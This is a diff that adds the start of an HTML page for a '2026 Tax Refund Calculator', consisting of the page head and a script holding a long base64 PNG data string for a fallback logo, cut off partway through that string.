@@ -1,0 +1,1861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2026 Tax Refund Calculator — 2 File EZ</title>
+<script>var LOGO_FALLBACK="data:image/png;base64,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